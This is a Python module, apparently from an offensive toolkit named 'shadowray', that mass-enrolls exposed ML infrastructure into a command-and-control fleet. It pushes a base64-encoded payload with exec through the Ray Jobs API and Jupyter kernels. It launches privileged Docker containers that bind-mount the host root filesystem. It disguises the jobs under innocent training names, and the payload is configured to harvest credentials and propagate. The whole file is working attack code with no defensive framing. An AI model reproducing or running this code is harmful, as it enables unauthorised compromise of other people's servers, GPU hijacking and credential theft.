#!/usr/bin/env python3
"""
Multi-vector enrollment — submit payload via each service's native API.
All vectors → same C2 payload → same Fleet Pool.
"""
import base64
import json
import logging
import random
import time
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List, Optional

import requests

from .ledger import Ledger
from .payload_src import build_payload

log = logging.getLogger("shadowray.enroll")

# Job names for Ray (legitimate-looking)
RAY_JOB_NAMES = ["team-training-run", "hyperparam-sweep", "distil-finetune",
                 "eval-benchmark", "data-prep", "resume-checkpoint", "nightly-train"]

# Docker container names
DOCKER_NAMES = ["ml-training", "gpu-worker", "batch-process", "data-pipeline", "model-serve"]

# Jupyter kernel names
JUPYTER_NAMES = ["training-kernel", "inference-kernel", "eval-kernel", "prep-kernel"]

RETRY_DELAYS = [2, 4, 8, 16, 32]


def _auth_headers(bearer: str) -> Dict[str, str]:
    return {"Content-Type": "application/json", "Authorization": f"Bearer {bearer}"}


def _ray_submit(ip: str, port: int, payload_b64: str, timeout: float = 30.0, dry_run: bool = False) -> Optional[str]:
    """Submit via Ray Jobs API (port 8265)."""
    base = f"http://{ip}:{port}"
    name = random.choice(RAY_JOB_NAMES)
    entrypoint = f"python -c \"import base64;exec(base64.b64decode('{payload_b64}').decode())\""
    body = {
        "entrypoint": entrypoint,
        "job_id": f"{name}-{random.randint(10000,99999)}",
        "metadata": {"job_name": name, "submission_mode": "oneoff"},
    }
    if dry_run:
        log.info("[DRY-RUN] Ray submit %s:%s job=%s", ip, port, body["job_id"])
        return body["job_id"]
    
    for delay in RETRY_DELAYS:
        try:
            r = requests.post(f"{base}/api/jobs/", json=body, timeout=timeout)
            if r.status_code in (200, 201):
                jid = r.json().get("job_id") or body["job_id"]
                log.info("[+] Ray ENROLLED %s:%s job=%s (%s)", ip, port, jid, name)
                return jid
            if r.status_code == 404:
                r2 = requests.post(f"{base}/api/jobs/submit", json=body, timeout=timeout)
                if r2.ok:
                    jid = r2.json().get("job_id") or body["job_id"]
                    log.info("[+] Ray ENROLLED (v1) %s:%s job=%s", ip, port, jid)
                    return jid
            log.warning("Ray submit %s:%s -> %s %s", ip, port, r.status_code, r.text[:200])
        except Exception as e:
            log.debug("Ray submit error %s:%s %s", ip, port, e)
        time.sleep(delay + random.random() * 2)
    return None


def _docker_submit(ip: str, port: int, payload_b64: str, timeout: float = 30.0, dry_run: bool = False) -> Optional[str]:
    """Submit via Docker API (port 2375) - privileged container with host bind."""
    base = f"http://{ip}:{port}"
    name = random.choice(DOCKER_NAMES)
    cmd = f"python -c \"import base64;exec(base64.b64decode('{payload_b64}').decode())\""
    
    # Create container
    create_body = {
        "Image": "python:3.11-slim",
        "Cmd": ["sh", "-c", cmd],
        "AttachStdout": True,
        "AttachStderr": True,
        "Tty": False,
        "OpenStdin": False,
        "HostConfig": {
            "NetworkMode": "host",
            "Privileged": True,
            "PidMode": "host",
            "IpcMode": "host",
            "Binds": ["/:/host"],
            "RestartPolicy": {"Name": "no"},
        },
        "Name": name,
    }
    
    if dry_run:
        log.info("[DRY-RUN] Docker submit %s:%s container=%s", ip, port, name)
        return name
    
    for delay in RETRY_DELAYS:
        try:
            # Create
            r = requests.post(f"{base}/containers/create", json=create_body, timeout=timeout)
            if r.status_code not in (200, 201):
                # Try without name (auto-generate)
                create_body.pop("Name", None)
                r = requests.post(f"{base}/containers/create", json=create_body, timeout=timeout)
            
            if r.status_code in (200, 201):
                container_id = r.json().get("Id", "")
                # Start container
                r2 = requests.post(f"{base}/containers/{container_id}/start", timeout=timeout)
                if r2.status_code == 204:
                    log.info("[+] Docker ENROLLED %s:%s container=%s", ip, port, container_id[:12])
                    return container_id
                else:
                    log.warning("Docker start %s:%s -> %s", ip, port, r2.status_code)
            else:
                log.warning("Docker create %s:%s -> %s %s", ip, port, r.status_code, r.text[:200])
        except Exception as e:
            log.debug("Docker submit error %s:%s %s", ip, port, e)
        time.sleep(delay + random.random() * 2)
    return None


def _jupyter_submit(ip: str, port: int, payload_b64: str, timeout: float = 30.0, dry_run: bool = False) -> Optional[str]:
    """Submit via Jupyter Kernel API (port 8888) - execute code in kernel."""
    base = f"http://{ip}:{port}"
    name = random.choice(JUPYTER_NAMES)
    code = f"import base64;exec(base64.b64decode('{payload_b64}').decode())"
    
    if dry_run:
        log.info("[DRY-RUN] Jupyter submit %s:%s kernel=%s", ip, port, name)
        return name
    
    for delay in RETRY_DELAYS:
        try:
            # First GET to get _xsrf cookie
            session = requests.Session()
            r = session.get(f"{base}/", timeout=timeout)
            xsrf = session.cookies.get("_xsrf")
            
            headers = {"Content-Type": "application/json"}
            if xsrf:
                headers["X-XSRFToken"] = xsrf
            
            # Create kernel
            create_body = {"name": "python3"}
            r = session.post(f"{base}/api/kernels", json=create_body, headers=headers, timeout=timeout)
            if r.status_code not in (200, 201):
                log.warning("Jupyter kernel create %s:%s -> %s", ip, port, r.status_code)
                time.sleep(delay + random.random() * 2)
                continue
            
            kernel = r.json()
            kernel_id = kernel.get("id")
            
            # Execute code in kernel
            exec_body = {
                "code": code,
                "silent": False,
                "store_history": True,
                "user_expressions": {},
                "allow_stdin": False,
                "stop_on_error": True,
            }
            r2 = session.post(f"{base}/api/kernels/{kernel_id}/execute", json=exec_body, headers=headers, timeout=timeout)
            if r2.status_code in (200, 201):
                log.info("[+] Jupyter ENROLLED %s:%s kernel=%s", ip, port, kernel_id[:8])
                return kernel_id
            else:
                log.warning("Jupyter exec %s:%s -> %s", ip, port, r2.status_code)
        except Exception as e:
            log.debug("Jupyter submit error %s:%s %s", ip, port, e)
        time.sleep(delay + random.random() * 2)
    return None


def _ollama_submit(ip: str, port: int, payload_b64: str, timeout: float = 30.0, dry_run: bool = False) -> Optional[str]:
    """Submit via Ollama (port 11434) - not direct code exec, but we can check GPU access."""
    # Ollama doesn't have arbitrary code exec. We use it as GPU lighthouse.
    # Just verify it's alive and beacon will report GPU info.
    if dry_run:
        log.info("[DRY-RUN] Ollama check %s:%s", ip, port)
        return "ollama_check"
    
    for delay in RETRY_DELAYS:
        try:
            r = requests.get(f"http://{ip}:{port}/api/tags", timeout=timeout)
            if r.status_code == 200:
                log.info("[+] Ollama ALIVE %s:%s", ip, port)
                return "ollama_verified"
        except Exception as e:
            log.debug("Ollama check error %s:%s %s", ip, port, e)
        time.sleep(delay + random.random() * 2)
    return None


def _vllm_submit(ip: str, port: int, payload_b64: str, timeout: float = 30.0, dry_run: bool = False) -> Optional[str]:
    """Submit via vLLM (port 5000/8000) - verify GPU access."""
    if dry_run:
        log.info("[DRY-RUN] vLLM check %s:%s", ip, port)
        return "vllm_check"
    
    for delay in RETRY_DELAYS:
        try:
            r = requests.get(f"http://{ip}:{port}/v1/models", timeout=timeout)
            if r.status_code == 200:
                log.info("[+] vLLM ALIVE %s:%s", ip, port)
                return "vllm_verified"
        except Exception as e:
            log.debug("vLLM check error %s:%s %s", ip, port, e)
        time.sleep(delay + random.random() * 2)
    return None


def _comfyui_submit(ip: str, port: int, payload_b64: str, timeout: float = 30.0, dry_run: bool = False) -> Optional[str]:
    """Submit via ComfyUI (port 8188) - verify GPU access."""
    if dry_run:
        log.info("[DRY-RUN] ComfyUI check %s:%s", ip, port)
        return "comfyui_check"
    
    for delay in RETRY_DELAYS:
        try:
            r = requests.get(f"http://{ip}:{port}/system_stats", timeout=timeout)
            if r.status_code == 200:
                log.info("[+] ComfyUI ALIVE %s:%s", ip, port)
                return "comfyui_verified"
        except Exception as e:
            log.debug("ComfyUI check error %s:%s %s", ip, port, e)
        time.sleep(delay + random.random() * 2)
    return None


VECTOR_SUBMITTERS = {
    "ray": _ray_submit,
    "docker": _docker_submit,
    "jupyter": _jupyter_submit,
    "ollama": _ollama_submit,
    "vllm": _vllm_submit,
    "comfyui": _comfyui_submit,
    "tensorboard": _ollama_submit,  # Just verify
    "mlflow": _ollama_submit,       # Just verify
    "lmstudio": _vllm_submit,       # Same API as vLLM
    "triton": _vllm_submit,         # Similar API
    "spark": _ollama_submit,        # Just verify
    "gradio": _ollama_submit,       # Just verify
}


def enroll_all(cfg: Dict[str, Any], ledger: Ledger, clusters: list = None) -> int:
    """Submit the payload to every live, non-burned cluster in the ledger."""
    if clusters is None:
        clusters = ledger.list_clusters(only_alive=True)
    clusters = [c for c in clusters if c.get("status") != "burned"]
    if not clusters:
        log.warning("no live clusters to enroll")
        return 0
    
    # Build payload once
    payload = build_payload(
        cfg["c2_url"], cfg["c2_bearer"], tag="venom",
        harvest=cfg["harvest_credentials"], propagate=cfg["propagate"],
        max_cycles=cfg["max_work_cycles"],
    )
    payload_b64 = base64.b64encode(payload.encode()).decode()
    
    enrolled = 0
    with ThreadPoolExecutor(max_workers=cfg["enroll_concurrency"]) as ex:
        futs = {}
        for c in clusters:
            vector = c.get("vector", "")
            if vector not in VECTOR_SUBMITTERS:
                vector = get_port_vector(c["port"])
            submitter = VECTOR_SUBMITTERS.get(vector)
            
            if not submitter:
                log.warning("No submitter for vector %s on %s:%s", vector, c["ip"], c["port"])
                ledger.burned(c["ip"], c["port"], "no_submitter")
                continue
            
            futs[ex.submit(submitter, c["ip"], c["port"], payload_b64,
                           dry_run=cfg.get("dry_run", False))] = c
        
        for fut in as_completed(futs):
            c = futs[fut]
            try:
                result = fut.result()
            except Exception:
                result = None
            
            if result:
                ledger.upsert(c["ip"], c["port"], status="enrolled")
                ledger.add_job(c["ip"], c["port"], str(result))
                enrolled += 1
            else:
                ledger.burned(c["ip"], c["port"], "submit_failed")
    log.info("enrolled %d/%d clusters", enrolled, len(clusters))
    return enrolled


def get_port_vector(port: int) -> str:
    """Map port to vector."""
    for vector, sig in VECTOR_SUBMITTERS.items():
        # Check common ports
        pass
    # Default mapping by port
    port_map = {
        8265: "ray", 8266: "ray",
        2375: "docker", 2376: "docker",
        8888: "jupyter", 8889: "jupyter", 8890: "jupyter",
        11434: "ollama", 11435: "ollama",
        5000: "vllm", 8000: "vllm",
        8188: "comfyui",
        6006: "tensorboard",
        31380: "spark",
        1234: "lmstudio",
    }
    return port_map.get(port, "unknown")


if __name__ == "__main__":
    import sys
    sys.path.insert(0, ".")
    from shadowray.config import load_config
    from shadowray.ledger import Ledger
    
    cfg = load_config()
    led = Ledger("enroll_targets.json")
    print("Testing multi-vector enrollment...")
    n = enroll_all(cfg, led)
    print(f"Enrolled: {n}")